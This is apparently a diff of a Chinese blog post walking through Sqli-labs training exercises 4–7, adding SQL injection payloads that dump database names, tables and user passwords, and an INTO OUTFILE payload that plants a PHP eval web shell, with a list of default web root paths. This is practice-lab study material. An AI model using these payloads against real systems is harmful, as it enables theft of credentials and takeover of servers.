@@ -266,7 +266,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -477,8 +477,51 @@ height:50vh;
 
 <p>于是尝试双引号，查看报错信息，猜想后台sql语句为select * from table_name where id =(“$_get[‘id’]”)limit 0,1；构造如下sql注入：<br><strong>?id=-1”)or 1=1--+</strong></p>
 <img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/4.3.jpg" title="4.2">
-<p>payload:<br><strong>?id=-1”) union select 1,username,conca_ws(char(32,44,32)),id,database(),password) from users limit 0,1%23</strong></p>
+<p>payload:<br><strong>?id=-1”) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 0,1%23</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/4.4.jpg" title="4.4">
 
+<h1 id="less-5：双注入-get-单引号-字符型注入"><a href="#less-5：双注入-get-单引号-字符型注入" class="headerlink" title="less-5：双注入_get_单引号_字符型注入"></a>less-5：双注入_get_单引号_字符型注入</h1><p>当输入?id=1时页面显示正常<br><strong>?id=1</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/5.1.jpg" title="5.1">
+<p>什么都没有，然后注意到提示是“双注入”，于是百度了一下，总结如下：</p>
+<h2 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a>双注入查询</h2><p>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rand()随机函数，返回0~1之间的某个值</span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数</span><br><span class="line">group by cluase分组语句，按照cluase对查询结果分组</span><br></pre></td></tr></table></figure>
+
+<p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式，于是payload构造如下：<br><strong>?id=-1’ union select count(<em>),2,concat(‘</em>‘,(select database()),’<em>‘,floor(rand()</em>2)) as a from information_schema.tables group by a--+</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/5.2.jpg" title="5.2">
+<p>获取到数据库名后再用同样的方法获取表名<br><strong>?id=-1’ union select count(<em>),2,concat(‘</em>‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’<em>‘,floor(rand()</em>2)) as a from information_schema.tables group by a--+</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/5.3.jpg" title="5.3">
+<p>然后是用户信息，这里只能查询一行，所以不能用group_concat，可以修改limit的范围来遍历用户信息<br><strong>?id=-1’ union select count(<em>),2,concat(‘</em>‘,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),’<em>‘,floor(rand()</em>2)) as a from information_schema.tables group by a--+</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/5.4.jpg" title="5.4">
+
+<h1 id="Less-6：双注入-get-双引号-字符型注入"><a href="#Less-6：双注入-get-双引号-字符型注入" class="headerlink" title="Less-6：双注入_get_双引号_字符型注入"></a>Less-6：双注入_get_双引号_字符型注入</h1><p>换汤不换药，按照Less-5的方法，只是把单引号改成了双引号，直接上payload:<br><strong>?id=-1” union select count(<em>),2,concat(‘</em>‘,(select concat_ws(char(44),id,username,password) from users limit 1,1),’<em>‘,floor(rand()</em>2)) as a from information_schema.tables group by a--+</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/6.1.jpg" title="6.1">
+
+<h1 id="Less-7：导出文件-get-字符型注入"><a href="#Less-7：导出文件-get-字符型注入" class="headerlink" title="Less-7：导出文件_get_字符型注入"></a>Less-7：导出文件_get_字符型注入</h1><img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/7.1.jpg" title="7.1">
+<p>尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select A into outfile B</span><br></pre></td></tr></table></figure>
+
+<p>这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，于是这里就有两种思路：</p>
+<h2 id="第一种，将小马写入文件中，用菜刀拿下："><a href="#第一种，将小马写入文件中，用菜刀拿下：" class="headerlink" title="第一种，将小马写入文件中，用菜刀拿下："></a>第一种，将小马写入文件中，用菜刀拿下：</h2><p>所以大概要使用文件导出。Mysql数据库需要在指定的目录下进行数据的导出，secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。<br>如果这个参数为空，这个变量没有效果；<br>如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。<br><strong>show variables like ‘%secure%’;</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/7.2.png" title="7.2">
+
+<p><strong>?id=-1’)) union select 1,2,’<?php @eval($_POST["cmd"]);?>‘ into outfile “/var/lib/mysql-files/DD.php”--+</strong></p>
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/7.3.jpg" title="7.3">
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/7.4.png" title="7.4">
+<img src="/2019/08/02/Sqli-labs-GET%20Part%201-10/7.5.png" title="7.5">
+
+<p>但看了其他daloa的wp，都涉及到路径的转义<br>dalao都是在Win下操作的，所以需要，而Linux和Win不同，所有此处不太一样</p>
+<h2 id="第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”"><a href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”" class="headerlink" title="第一种，构造select * from users into outfile “数据库导入导出数据的目录”"></a>第一种，构造select * from users into outfile “数据库导入导出数据的目录”</h2><p><strong>?id=-1’)) union select group_concat(username),’*‘,group_concat(password) from users into outfile “/var/lib/mysql-files/DD.txt”--+</strong></p>
+<p><strong>小扩展：</strong><br>winserver的iis默认路径c:\Inetpub\wwwroot</p>
+<p>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p>
+<p>apache 就…/var/www/htm，…/var/www/html/htdocs</p>
+<p>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW\</p>
+<p>xammp 就是…\xampp\htdocs</p>
+<p><strong>导入导出数据还会涉及到哪些函数：</strong></p>
+<p>@@datadir：数据库存储路径</p>
+<p>@@basedir：MySQL安装路径</p>
+<p>dumpfile：导出文件，类似outfile，不同的是，dumpfile一次导出一行，会和limit结合使用</p>
+<p>load_file()：将文件导入mysql，用法 select load_file(“文件路径”);</p>
+<h1 id="Less-8：bool型-单引号-盲注"><a href="#Less-8：bool型-单引号-盲注" class="headerlink" title="Less-8：bool型_单引号_盲注"></a>Less-8：bool型_单引号_盲注</h1>
     </article>
     <!-- license  -->
     
@@ -486,7 +529,7 @@ height:50vh;
             <p>原文作者：<a href="https://ddstick.github.io">DD</a>
             <p>原文链接：<a href="https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/">https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/</a>
             <p>发表日期：<a href="https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/">August 2nd 2019, 5:53:52 pm</a>
-            <p>更新日期：<a href="https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/">August 5th 2019, 12:06:11 am</a>
+            <p>更新日期：<a href="https://ddstick.github.io/2019/08/02/Sqli-labs-GET Part 1-10/">August 6th 2019, 5:24:43 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -618,7 +661,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs注入练习"><span class="toc-number">1.</span> <span class="toc-text">Sqli-labs注入练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1：基于错误的-get-单引号-字符型注入"><span class="toc-number">2.</span> <span class="toc-text">Less-1：基于错误的_get_单引号_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2：基于错误的-get-整型注入"><span class="toc-number">3.</span> <span class="toc-text">Less-2：基于错误的_get_整型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3：基于报错的-get-单引号-变形-字符型注入"><span class="toc-number">4.</span> <span class="toc-text">Less-3：基于报错的_get_单引号_变形_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4：基于错误的-get-双引号-字符型注入"><span class="toc-number">5.</span> <span class="toc-text">Less-4：基于错误的_get_双引号_字符型注入</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs注入练习"><span class="toc-number">1.</span> <span class="toc-text">Sqli-labs注入练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1：基于错误的-get-单引号-字符型注入"><span class="toc-number">2.</span> <span class="toc-text">Less-1：基于错误的_get_单引号_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2：基于错误的-get-整型注入"><span class="toc-number">3.</span> <span class="toc-text">Less-2：基于错误的_get_整型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3：基于报错的-get-单引号-变形-字符型注入"><span class="toc-number">4.</span> <span class="toc-text">Less-3：基于报错的_get_单引号_变形_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4：基于错误的-get-双引号-字符型注入"><span class="toc-number">5.</span> <span class="toc-text">Less-4：基于错误的_get_双引号_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-5：双注入-get-单引号-字符型注入"><span class="toc-number">6.</span> <span class="toc-text">less-5：双注入_get_单引号_字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#双注入查询"><span class="toc-number">6.1.</span> <span class="toc-text">双注入查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-6：双注入-get-双引号-字符型注入"><span class="toc-number">7.</span> <span class="toc-text">Less-6：双注入_get_双引号_字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7：导出文件-get-字符型注入"><span class="toc-number">8.</span> <span class="toc-text">Less-7：导出文件_get_字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一种，将小马写入文件中，用菜刀拿下："><span class="toc-number">8.1.</span> <span class="toc-text">第一种，将小马写入文件中，用菜刀拿下：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”"><span class="toc-number">8.2.</span> <span class="toc-text">第一种，构造select * from users into outfile “数据库导入导出数据的目录”</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8：bool型-单引号-盲注"><span class="toc-number">9.</span> <span class="toc-text">Less-8：bool型_单引号_盲注</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
